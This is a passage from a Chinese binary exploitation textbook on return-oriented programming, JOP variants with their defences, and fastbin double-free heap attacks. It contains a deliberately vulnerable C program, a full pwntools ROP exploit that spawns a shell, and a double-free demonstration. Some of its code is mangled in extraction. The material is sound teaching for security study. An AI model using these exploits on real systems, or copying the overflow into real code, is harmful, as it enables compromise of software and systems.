; gadget 3
ret
int 0x80
; gadget 4
为了完成指令序列的构建，首先需要找到这些以 ret 指令结尾，并且在执行时必然以 ret 结束，
而不会跳到其他地方的 gadget，算法如图 10-4 所示。
图 10-4
gadget 搜索算法
第 10 章
栈溢出与 ROP ┃ XLVI
即扫描二进制找到 ret（c3）指令，将其作为 trie 的根节点，然后回溯解析前面的指令，如果是
有效指令，将其添加为子节点，再判断是否 boring；如果不是，就继续递归回溯。举个例子，在一
个 trie 中一个表示 pop %eax 的节点是表示 ret 的根节点的子节点，则这个 gadget 为 pop %eax; ret。
如此就能把有用的 gadgets 都找出来了。boring 指令则分为三种情况：
（1）该指令是 leave，后跟一个 ret 指令；
（2）该指令是一个 pop %ebp，后跟一个 ret 指令；
（3）该指令是返回或者非条件跳转。
实际上，有很多工具可以帮助我们完成 gadget 搜索的工作，常用的有 ROPgadget、Ropper 等，
还可以直接在 ropshell 网站上搜索。
gadgets 在多个体系架构上都是图灵完备的，允许任意复杂度的计算，也就是说基本上只要能想
到的事情它都可以做。下面简单介绍几种用法。
（1）保存栈数据到寄存器。弹出栈顶数据到寄存器中，然后跳转到新的栈顶地址。所以当返回
地址被一个 gadget 的地址覆盖，程序将在返回后执行该指令序列。例如：pop eax; ret；
（2）保存内存数据到寄存器。例如：mov ecx,[eax]; ret；
（3）保存寄存器数据到内存。例如：mov [eax],ecx; ret；
（4）算数和逻辑运算。add、sub、mul、xor 等。例如：add eax,ebx; ret, xor edx,edx; ret；
（5）系统调用。执行内核中断。例如：int 0x80; ret, call gs:[0x10]; ret；
（6）会影响栈帧的 gadget。这些 gadget 会改变 ebp 的值，从而影响栈帧，在一些操作如 stack
pivot 时我们需要这样的指令来转移栈帧。例如：leave; ret, pop ebp; ret。
10.2.2
ROP 的变种
论文 Return-Oriented Programming without Returns 中指出，正常程序的指令流执行和 ROP 的指
令流有很大不同，至少存两点：第一，ROP 执行流会包含很多 ret 指令，而且这些 ret 指令可能只间
隔了几条其他指令；第二，ROP 利用 ret 指令来 unwind 堆栈，却没有与 ret 指令相对应的 call 指令。
针对上面两点不同，研究人员随后提出了多种 ROP 检测和防御技术，例如：针对第一点，可以
检测程序执行中是否有频繁 ret 的指令流，作为报警的依据；针对第二点，可以通过 call 和 ret 指令
的配对情况来判断异常。或者维护一个影子栈（shadow stack）作为正常栈的备份，每次 ret 的时候
就与正常栈对比一下；还有更极端的，直接在编译器层面重写二进制文件，消除里面的 ret 指令。
这些早期的防御技术其实都默认了一个前提，即 ROP 中必定存在 ret 指令。那么反过来想，如
果攻击者能够找到既不使用 ret 指令，又能改变执行流的 ROP 链，就能成功绕过这些防御。于是，
就诞生了不依赖于 ret 指令的 ROP 变种。
我们知道 ret 指令的作用主要有两个：一个是通过间接跳转改变执行流，另一个是更新寄存器状
第 10 章
栈溢出与 ROP ┃ XLVII
态。在 x86 和 ARM 中都存在一些指令序列，也能够完成这些工作，它们首先更新全局状态（如栈
指针），然后根据更新后的状态加载下一条指令的地址，并跳转过去执行。我们把这样的指令序列
叫作 update-load-branch，使用它们来避免 ret 指令的使用。由于 update-load-branch 相比 ret 指令更加
稀少，所以通常作为跳板（trampoline）来重复利用。当一个 gadget 执行结束后，跳转到 trampoline，
trampoline 更新程序状态后把控制权交到下一个 gadget，由此形成 ROP 链。如图 10-5 所示。
图 10-5
不依赖 ret 指令的 ROP
由于这些 gadgets 都以 jmp 指令作为结尾，我们就称之为 JOP（Jump-Oriented Programming），
考虑下面的 gadget：
pop %eax; jmp *%eax
它的行为和 ret 很像，唯一的副作用是覆盖了 eax 寄存器，假如程序执行不依赖于 eax，那么这
一段指令就可以取代 ret。当然，eax 可以被换成任意一个通用寄存器，而且比起单间接跳转，我们
通常更愿意使用双重间接跳转：
pop %eax; jmp *(%eax)
此时，eax 存放的是一个被称为 sequence catalog 表的地址，该表用于存放各种指令序列的地址，
也就是一个类似于 GOT 表的东西。所谓双间接跳转，就是先从上一段指令序列跳到 catalog 表，然
后从 catalog 表跳到下一段指令序列。这样做使得 ROP 链的构造更加便捷，甚至可以根据偏移来实
现跳转。如图 10-6 所示。
图 10-6
JOP 示例
第 10 章
栈溢出与 ROP ┃ XLVIII
另一篇论文 Jump-Oriented Programming: A New Class of Code-Reuse Attack 几乎同时提出了这种
基于 jmp 指令的攻击方法。除此之外，ROP 的变种还包括 string-oriented programming(SOP)、
sigreturn-oriented programming(SROP) 、 data-oriented programming(DOP) 、 crash-resistant oriented
programming(CROP)和 printf programming。
10.2.3
示例
ROP 的 payload 由一段触发栈溢出的 padding 和各条 gadget 及其参数组成，这些参数通常用于
pop 指令，来设置寄存器的值。当函数返回时，将执行第一条 gadget 1，直到遇到 ret 指令，再跳转
到 gadget 2 继续执行，以此类推。内存布局如图 10-7 所示。
图 10-7
ROP 的内存布局示例
将下面的示例代码编译成带 PIE 的 64 位程序。由于 64 位程序在传递前几个参数时使用了寄存
器，而不是栈，所以就需要攻击者找到一些 gadgets 用于设置寄存器的值。在这里就是“pop rdi; ret”，
用于将“/bin/sh”的地址存到 rdi 寄存器。
#include 
#include 
#include 
void vuln_func() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}
int main(int argc, char *argv[]) {
void *handle = dlopen("libc.so.6", RTLD_NOW | RTLD_GLOBAL);
printf("%p\n", dlsym(handle, "system"));
vuln_func();
write(STDOUT_FILENO, "Hello world!\n", 13);
}
$ gcc -fno-stack-protector -z noexecstack -pie -fpie rop.c -ldl -o rop64
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.23.so --only "pop|ret" | grep rdi
第 10 章
栈溢出与 ROP ┃ XLIX
0x0000000000021102 : pop rdi ; ret
方便起见，程序直接打印了 system 函数的地址，来模拟信息泄露。完整的利用代码如下所示。
from pwn import *
io = process('./rop64')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
system_addr = int(io.recvline(), 16)
libc_addr = system_addr - libc.sym['system']
binsh_addr = libc_addr + next(libc.search('/bin/sh'))
pop_rdi_addr = libc_addr + 0x0000000000021102
payload = "A"*136 + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)
io.send(payload)
io.interactive()
第 11 章
堆利用 ┃ L
第 11 章
堆利用
11.3
fastbin 二次释放
由于 fastbin 采用单链表结构（通过 fd 指针进行链接），且当 chunk 释放时，不会清空 next_chunk
的 prev_inuse，再加上一些检查机制上的不完善，使得 fastbin 比较脆弱。针对它的攻击方法包括二
次释放、修改 fd 指针并申请（或释放）任意位置的 chunk（或 fake chunk）等，条件是存在堆溢出或
者其他漏洞可以控制 chunk 的内容。
11.3.1
fastbin dup
fastbin chunk 可以很轻松地绕过检查多次释放，当这些 chunk 被重新分配出来时，就会导致多个
指针指向同一个 chunk。
fastbin 对二次释放的检查机制仅仅验证了当前块是否与链表头部的块相同，而对链表中其他的
块则没有做验证。另外，在释放时还有对当前块的 size 域与头部块的 size 域是否相等的检查，由于
我们释放的是同一个块，也就不存在该问题，如下所示。
mchunkptr old = *fb, old2;
unsigned int old_idx = ~0u;
do {
/* Check that the top of the bin is not the record we are going to add
(i.e., double free).
*/
if (__builtin_expect (old == p, 0)) {
errstr = "double free or corruption (fasttop)";
goto errout;
}
if (have_lock && old != NULL)
old_idx = fastbin_index(chunksize(old));
p->fd = old2 = old;
}
while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);
第 11 章
堆利用 ┃ LI
if (have_lock && old != NULL && __builtin_expect (old_idx != idx, 0)) {
errstr = "invalid fastbin entry (free)";
goto errout;
}
下面来看一个例子，在两次调用 free(a)之间，插入其他的释放操作，即可绕过检查。
#include 
#include 
int main() {
/* fastbin double-free */
int *a = malloc(8);
// malloc 3 buffers
int *b = malloc(8);
int *c = malloc(8);
fprintf(stderr, "malloc a: %p\n", a);
fprintf(stderr, "malloc b: %p\n", b);
fprintf(stderr, "malloc c: %p\n", c);
free(a);
// free the first one
free(b);
// free the other one
free(a);
// free the first one again
fprintf(stderr, "free a => free b => free a\n");
int *d = malloc(8);
// malloc 3 buffers again
int *e = malloc(8);
int *f = malloc(8);
fprintf(stderr, "malloc d: %p\n", d);
fprintf(stderr, "malloc e: %p\n", e);
fprintf(stderr, "malloc f: %p\n", f);
for(int i=0; i free b => free a
malloc d: 0x186c010
malloc e: 0x186c030
malloc f: 0x186c010
0x186c030
0x186c010
...
stack_var: 0x7ffe9a4da1b0
malloc g: 0x186c030
malloc h: 0x186c010
malloc i: 0x186c030
malloc j: 0x7ffe9a4da1b8
先看程序的前半部分（标记为“fastbin double-free”），释放后的 fastbins 如下所示。
gef➤
p main_arena.fastbinsY
$1 = {0x602000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gef➤
x/16gx 0x602000
0x602000:
0x0000000000000000
0x0000000000000021
<- chunk_a [double-free]
0x602010:
0x0000000000602020
0x0000000000000000
<- fd
0x602020:
0x0000000000000000
0x0000000000000021
<- chunk_b [free]
0x602030:
0x0000000000602000
0x0000000000000000
<- fd
0x602040:
0x0000000000000000
0x0000000000000021
<- chunk_c
0x602050:
0x0000000000000000
0x0000000000000000
0x602060:
0x0000000000000000
0x0000000000020fa1
<- top chunk
gef➤
heap bins fast
Fastbins[idx=0, size=0x10]
←
Chunk(addr=0x602010, size=0x20,
flags=PREV_INUSE)
←
Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)
←
Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
→
[loop detected]
接下来调用 3 个 malloc()函数，依次从 fastbin 中取出 chunk_a、chunk_b 和 chunk_a。事实上，
由于 chunk_a 和 chunk_b 已经形成了循环，我们几乎可以无限次地调用 malloc()函数，如图 11-10 所
示。
第 11 章
堆利用 ┃ LIII
图 11-10
二次释放后的链表
那么如果我们不希望一直循环地调用 malloc()函数，应该怎么做呢？答案是修改 fd 指针。来看
程序的后半部分（标记为“fastbin dup into stack”）。假设能够在栈上随意写入（本例中 stack_var
被赋值为 0x21，作为 fake chunk 的 size），且可以修改 chunk 的内容，那么就可以利用二次释放获
取 chunk，修改其 fd 指针指向任意伪造的 chunk（任意可写内存，stack、bss、heap 等），并在随后
的 malloc()调用中将伪造的 chunk 变成真实的 chunk。如图 11-11 所示。
gef➤
p main_arena.fastbinsY